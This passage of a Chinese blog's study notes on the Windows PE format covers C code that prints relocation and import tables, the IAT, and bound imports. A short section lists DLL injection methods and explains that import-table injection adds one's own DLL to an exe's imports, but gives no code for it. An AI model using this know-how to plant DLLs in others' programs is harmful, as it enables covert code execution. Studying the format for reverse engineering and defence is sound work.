(pRelocationTable-&gt;SizeOfBlock - <span class=\"number\">8</span>)/<span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//往后八个字节是重定位开始，每次往后两个字节</span></span><br><span class=\"line\">\t\tWORD* recAddr = (WORD*)((BYTE*)pRelocationTable+<span class=\"number\">0x08</span>); </span><br><span class=\"line\">\t\t<span class=\"comment\">//preadd += 4;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//for(int k=1;k&lt;(pRelocationTable-&gt;SizeOfBlock - 8)/2;k++)</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//&#123;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//\tpreadd = (*preadd) + (WORD*)pRelocationTable-&gt;VirtualAddress;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//\tprintf(&quot;%X-%X-%X&quot;,i,k,preadd);</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//&#125;</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> k=<span class=\"number\">0</span>;k&lt;(pRelocationTable-&gt;SizeOfBlock - <span class=\"number\">8</span>)/<span class=\"number\">2</span>;k++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//&amp;0xFFF 把后12位拿出来</span></span><br><span class=\"line\">\t\t\tDWORD pRepair_RvaOffset = (recAddr[k] &amp; <span class=\"number\">0x0FFF</span>) + RvaToFileOffset(pFileBuffer,pRelocationTable-&gt;VirtualAddress);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//DWORD pRepair_RvaOffset = RvaToFileOffset(pFileBuffer,pRelocationTable[k].VirtualAddress);</span></span><br><span class=\"line\">\t\t\tWORD type = recAddr[k] &gt;&gt; <span class=\"number\">12</span>;   <span class=\"comment\">//判断高四位是否为3</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(type!=<span class=\"number\">0</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;RVA:%X,type:%X\\r\\n&quot;</span>,pRepair_RvaOffset,type);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//pRelocationTable = (DWORD)pRelocationTable + pRelocationTable-&gt;SizeOfBlock;</span></span><br><span class=\"line\">\t\tpRelocationTable = (PIMAGE_BASE_RELOCATION )((BYTE *)pRelocationTable + pRelocationTable-&gt;SizeOfBlock);</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x5Z2wzNS9hcnRpY2xlL2RldGFpbHMvMTE4OTMxNTI4\"> 打印出重定位表（C 语言实现）_打印重定位表_lygl35 的博客 - CSDN 博客</span></p>\n<h3 id=\"移动导出表\"><a class=\"markdownIt-Anchor\" href=\"#移动导出表\">#</a> 移动导出表</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.在DLL中新增节，返回FOA</span><br><span class=\"line\">2.复制AddressOfFunctions 长度 4*NumberOfFunctions</span><br><span class=\"line\">3.移动AddressOfNameOrdinals 长度 2*NumberOfNames</span><br><span class=\"line\">4.复制AddressOfNames 长度  4*NumberOfNames</span><br><span class=\"line\">5.复制函数名 长度不确定，直接修复AddressOfNames，复制完一个名字，算下一个地址在哪里，算完在修复Names表</span><br><span class=\"line\">6.复制_IMAGE_EXPORT_DIRECTORY结构</span><br><span class=\"line\">7.修复_IMAGE_EXPORT_DIRECTORY中的AddressOfFunctions，AddressOfNames，AddressOfNameOrdinals</span><br><span class=\"line\">8.修复目录项中的值，指向新的_IMAGE_EXPORT_DIRECTORY</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.新增节</span><br><span class=\"line\">2.目录项改为新增节起始位置</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230312153214517.png\" alt=\"image-20230312153214517\"></p>\n<h3 id=\"iat\"><a class=\"markdownIt-Anchor\" href=\"#iat\">#</a> IAT</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">12:       MessageBox(0,0,0,0);</span><br><span class=\"line\">00401658 8B F4                mov         esi,esp</span><br><span class=\"line\">0040165A 6A 00                push        0</span><br><span class=\"line\">0040165C 6A 00                push        0</span><br><span class=\"line\">0040165E 6A 00                push        0</span><br><span class=\"line\">00401660 6A 00                push        0</span><br><span class=\"line\">00401662 FF 15 44 63 48 00    call        dword ptr [__imp__MessageBoxA@16 (00486344)]</span><br><span class=\"line\">00401668 3B F4                cmp         esi,esp</span><br><span class=\"line\">0040166A E8 91 23 02 00       call        __chkesp (00423a00)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">我们自己写的程序，call后的地址是写死的，直接编译到exe中，不管中间是否有jmp</span><br><span class=\"line\">调用dll的程序，call后是[x],[x]才是dll中函数真实的地址，x是exe空间内，[x]在dll空间内，x只有在所有dll都贴完只有才改x</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230313165403957.png\" alt=\"image-20230313165403957\"></p>\n<p>重定位表只能保证自己程序中的地址是正确的</p>\n<p>IAT 是保证调用 dll 的时候 call 的地址是正确的</p>\n<p>E8 call 是偏移</p>\n<p>FF 15 call 是绝对地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230313171609509.png\" alt=\"image-20230313171609509\"></p>\n<p>只要用 dll 函数，全都是通过 [x] 调用，这样形成的表叫做 IAT 表</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230313171956653.png\" alt=\"image-20230313171956653\"></p>\n<p>IAThook</p>\n<h3 id=\"导入表\"><a class=\"markdownIt-Anchor\" href=\"#导入表\">#</a> 导入表</h3>\n<p>目录项第二个就是导入表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;</span><br><span class=\"line\">    union &#123;</span><br><span class=\"line\">        DWORD   Characteristics;            // 0 for terminating null import descriptor</span><br><span class=\"line\">        DWORD   OriginalFirstThunk;         // RVA 指向 original unbound IAT (PIMAGE_THUNK_DATA) RVA指向IMAGE_THUNK_DATA结构数组</span><br><span class=\"line\">    &#125; DUMMYUNIONNAME;</span><br><span class=\"line\">    DWORD   TimeDateStamp;                  // 0 if not bound,</span><br><span class=\"line\">                                            // -1 if bound, and real date\\time stamp</span><br><span class=\"line\">                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br><span class=\"line\">                                            // O.W. date/time stamp of DLL bound to (Old BIND)</span><br><span class=\"line\"> </span><br><span class=\"line\">    DWORD   ForwarderChain;                 // -1 if no forwarders</span><br><span class=\"line\">    DWORD   Name;\t\t\t\t\t\t\t// RVA指向dll名字，以0结尾</span><br><span class=\"line\">    DWORD   FirstThunk;                     // RVA指向IMAGE_THUNK_DATA结构数组</span><br><span class=\"line\">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class=\"line\">typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>\n<p>PE 文件加载前</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230222142303612.png\" alt=\"image-20230222142303612\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过导入表的FirstThunk找到IAT</span><br><span class=\"line\">或者通过IMAGE_DATA_DIRECTORY的倒数第三张表找到IAT</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _IMAGE_THUNK_DATA32 &#123;</span><br><span class=\"line\">    union &#123;</span><br><span class=\"line\">        DWORD ForwarderString;      // PBYTE </span><br><span class=\"line\">        DWORD Function;             // PDWORD</span><br><span class=\"line\">        DWORD Ordinal;</span><br><span class=\"line\">        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME</span><br><span class=\"line\">    &#125; u1;</span><br><span class=\"line\">&#125; IMAGE_THUNK_DATA32;</span><br><span class=\"line\">typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class=\"line\"></span><br><span class=\"line\">加载前IAT和LNT里面都是RVA，且内容完全一样</span><br></pre></td></tr></table></figure>\n<p>加载后</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230222143253824.png\" alt=\"image-20230222143253824\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INT 表作为加载后函数名的备份，加载后IAT里面是全地址</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">打印导入表</span><br><span class=\"line\">1、循环IMAGE_IMPORT_DESCP</span><br><span class=\"line\">目录项目的第二个结构就是导入表</span><br><span class=\"line\">RVA-&gt;FOA</span><br><span class=\"line\">有多个IMAGE_IMPORT_DESCP个结构，因为会有多个dll</span><br><span class=\"line\">全0的结构代表结束</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">2.输出dll名字 Name</span><br><span class=\"line\">是RVA</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230314161704488.png\" alt=\"image-20230314161704488\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct _IMAGE_IMPORT_BY_NAME &#123;</span><br><span class=\"line\">    WORD    Hint;</span><br><span class=\"line\">    CHAR   Name[1];</span><br><span class=\"line\">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br><span class=\"line\"></span><br><span class=\"line\">把IMAGE_THUNK_DATA当左DWORD处理就行</span><br></pre></td></tr></table></figure>\n<p>4. 遍历 fitstThunk</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230314164742765.png\" alt=\"image-20230314164742765\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">PrintImportDirectory</span><span class=\"params\">(IN LPSTR lpszFile)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tDWORD fileLen = ReadPEFile(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_BASE_RELOCATION pRelocationTable = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_IMPORT_DESCRIPTOR pImportTable = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_IMPORT_BY_NAME pImportByName = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_THUNK_DATA pThunkData = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPDWORD intname = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPDWORD iatname = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//PIMAGE_BASE_RELOCATION pRelocationTable = NULL;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;\t<span class=\"comment\">// 强转 DOS_HEADER 结构体指针</span></span><br><span class=\"line\">\t<span class=\"comment\">//可选PE</span></span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"keyword\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\">\tpImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pFileBuffer + RvaToFileOffset(pFileBuffer, pOptionHeader-&gt;DataDirectory[<span class=\"number\">1</span>].VirtualAddress));</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; RvaToFileOffset(pFileBuffer, pOptionHeader-&gt;DataDirectory[<span class=\"number\">1</span>].VirtualAddress) &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"type\">char</span> end[<span class=\"keyword\">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR)] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;<span class=\"built_in\">memcmp</span>(end,pImportTable,<span class=\"keyword\">sizeof</span>(end));i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pImportTable-&gt;Name:%s\\n&quot;</span>,(DWORD)pFileBuffer + RvaToFileOffset(pFileBuffer, pImportTable-&gt;Name));</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pImportTable-&gt;Characteristics:%X\\n&quot;</span>,pImportTable-&gt;Characteristics);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pImportTable-&gt;TimeDateStamp:%X\\n&quot;</span>,pImportTable-&gt;TimeDateStamp);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pImportTable-&gt;ForwarderChain:%X\\n&quot;</span>,pImportTable-&gt;ForwarderChain);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pImportTable-&gt;FirstThunk:%X\\n&quot;</span>,pImportTable-&gt;FirstThunk);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pImportTable-&gt;OriginalFirstThunk:%X\\n&quot;</span>,pImportTable-&gt;OriginalFirstThunk);</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;------------------------\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tintname = (PDWORD)((DWORD)pFileBuffer + RvaToFileOffset(pFileBuffer, pImportTable-&gt;OriginalFirstThunk));</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">1</span>;*intname;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (*intname &amp; <span class=\"number\">0x80000000</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;按序号导出:%X\\n&quot;</span>,*intname &amp; <span class=\"number\">0x7fffffff</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pFileBuffer + RvaToFileOffset(pFileBuffer, *intname));</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pImportByName-&gt;Hint:%x, pImportByName-&gt;Name:%s\\n&quot;</span>,pImportByName-&gt;Hint, pImportByName-&gt;Name);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t*intname++;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;----------------------\\n&quot;</span>;</span><br><span class=\"line\">\t\tiatname = (PDWORD)((DWORD)pFileBuffer + RvaToFileOffset(pFileBuffer, pImportTable-&gt;FirstThunk));</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> k=<span class=\"number\">1</span>;*iatname;k++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (*iatname &amp; <span class=\"number\">0x80000000</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;按序号导出:%X\\n&quot;</span>,*iatname &amp; <span class=\"number\">0x7fffffff</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pFileBuffer + RvaToFileOffset(pFileBuffer, *iatname));</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pImportByName-&gt;Hint:%x, pImportByName-&gt;Name:%s\\n&quot;</span>,pImportByName-&gt;Hint, pImportByName-&gt;Name);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t*iatname++;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;----------------------\\n&quot;</span>;</span><br><span class=\"line\">\t\tpImportTable++;</span><br><span class=\"line\">\t\tsystem(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"绑定导入表\"><a class=\"markdownIt-Anchor\" href=\"#绑定导入表\">#</a> 绑定导入表</h3>\n<p>启动速度更快，在加载前 FirstThunk 已经是 RVA 了。如果 dll 需要重定位或者 dll 被修改了，那么这样就会有问题</p>\n<p>timedatestamp = -1 代表已经绑定了地址，真正的绑定时间为 IMAGE_BOUND_IMPORT_DESCRIPTOR 的 TimeDateStamp</p>\n<p>timedatestamp = 0 代表 dll 函数地址还没绑定</p>\n<p>绑定导入表位于数据目录的第 12 项</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR &#123;</span><br><span class=\"line\">    DWORD   TimeDateStamp;      //判断和fileheader里面的时间戳对比是否是同一版本</span><br><span class=\"line\">    WORD    OffsetModuleName;</span><br><span class=\"line\">    WORD    NumberOfModuleForwarderRefs;    // Array of zero or more IMAGE_BOUND_FORWARDER_REF follows boundim后面跟了多少个ref结构</span><br><span class=\"line\">&#125; IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _IMAGE_BOUND_FORWARDER_REF  &#123;</span><br><span class=\"line\">    DWORD   TimeDateStamp;   //和前一个一样</span><br><span class=\"line\">    WORD    OffsetModuleName;  //名字</span><br><span class=\"line\">    WORD    Reserved;</span><br><span class=\"line\">&#125; IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>当 IMAGE_BOUND_IMPORT_DESCRIPTOR 结构中的 TimeDateStamp 与 DLL 文件标准 PE 头中的 TimeDateStamp 值不相符时，或者 DLL 需要重新定位的时候，就会重新计算 IAT 中的值.</p>\n<p>第一个 PIMAGE_BOUND_IMPORT_DESCRIPTOR 的值 + OffsetModuleName = 名字的地址（OffsetModuleName）</p>\n<p>打印绑定导入表时如果 RVA &lt; header 的长度，那么直接输出，不在转 FOA</p>\n<p>移动导入表的时候可以移动 INT 表，但不能移动 IAT 表</p>\n<h3 id=\"导入表注入\"><a class=\"markdownIt-Anchor\" href=\"#导入表注入\">#</a> 导入表注入</h3>\n<p>1、注册表注入</p>\n<p>5、无 DLL 注入</p>\n<p>2、导入表注入</p>\n<p>6、Apc 注入</p>\n<p>3、特洛伊注入</p>\n<p>7、Windows 挂钩注入 DLL</p>\n<p>4、远程线程注入</p>\n<p>8、输入法注入</p>\n<p>当 Exe 被加载时，系统会根据 Exe 导入表信息来加载需要用到的 DLL, 导入表注入的原理就是修改 exe 导入表，将自己的 DLL 添加到 exe 的导入表中，这样 exe 运行时可以将自己的 DLL 加载到 exe 的进程空间.</p>\n<p>先加一个 PIMAGE_IMPORT_SEC，在创建 IAT 和 INT</p>\n<h2 id=\"c\"><a class=\"markdownIt-Anchor\" href=\"#c\">#</a> C++</h2>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">haha</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">\t<span class=\"type\">int</span> z;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">fun</span><span class=\"params\">(haha h)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\thaha sb;</span><br><span class=\"line\">\t<span class=\"built_in\">fun</span>(sb);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401068</span> <span class=\"number\">83</span> EC <span class=\"number\">0</span>C             sub         esp,<span class=\"number\">0</span>Ch</span><br><span class=\"line\"><span class=\"number\">0040106B</span> <span class=\"number\">8B</span> C4                mov         eax,esp</span><br><span class=\"line\"><span class=\"number\">0040106</span>D <span class=\"number\">8B</span> <span class=\"number\">4</span>D F4             mov         ecx,dword ptr [ebp<span class=\"number\">-0</span>Ch]</span><br><span class=\"line\"><span class=\"number\">00401070</span> <span class=\"number\">89</span> <span class=\"number\">08</span>                mov         dword ptr [eax],ecx</span><br><span class=\"line\"><span class=\"number\">00401072</span> <span class=\"number\">8B</span> <span class=\"number\">55</span> F8             mov         edx,dword ptr [ebp<span class=\"number\">-8</span>]</span><br><span class=\"line\"><span class=\"number\">00401075</span> <span class=\"number\">89</span> <span class=\"number\">50</span> <span class=\"number\">04</span>             mov         dword ptr [eax+<span 